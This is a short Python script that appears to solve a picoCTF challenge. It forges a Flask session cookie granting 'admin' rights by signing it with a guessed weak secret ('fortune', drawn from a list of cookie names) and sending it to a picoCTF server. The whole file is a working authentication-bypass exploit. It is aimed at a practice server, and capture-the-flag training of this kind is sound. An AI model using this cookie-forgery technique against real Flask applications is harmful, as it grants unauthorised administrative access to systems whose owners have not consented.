from flask_unsign import sign
from jinja2.utils import urlize

import requests

cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]

cookie = {"very_auth": "admin"}
cookie_name = "fortune"
url = "http://mercury.picoctf.net:18835"
#url = "http://127.0.0.1:5000"

c = sign(value=cookie, secret=cookie_name, legacy=True)

try:
    response = requests.get(url=url, cookies={"session": c})
    print(response.content)
except:
    print(cookie_name)
